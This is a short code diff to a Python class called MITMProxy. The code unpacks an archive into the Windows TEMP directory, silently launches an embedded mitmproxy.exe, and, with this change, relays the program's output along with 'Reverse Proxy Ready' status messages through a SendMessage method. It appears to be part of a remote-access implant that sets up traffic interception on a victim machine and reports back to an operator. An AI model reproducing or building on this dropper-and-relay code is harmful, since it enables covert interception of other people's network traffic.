@@ -45,7 +45,8 @@ class MITMProxy():
 		with ZipFile(filename, 'r') as zip_ref:
 			zip_ref.extractall(os.environ['TEMP'])
 		self.SendMessage(" ".join(["cmd.exe","/c",os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe"]))
-		os.popen(os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe")
+		a= os.popen(os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe").read()
+		self.SendMessage(a)
 		self.SendMessage(" MITMProxy Executed.")
 		self.SendMessage(" Reverse Proxy Ready.")
 	def SendMessage(self,message):
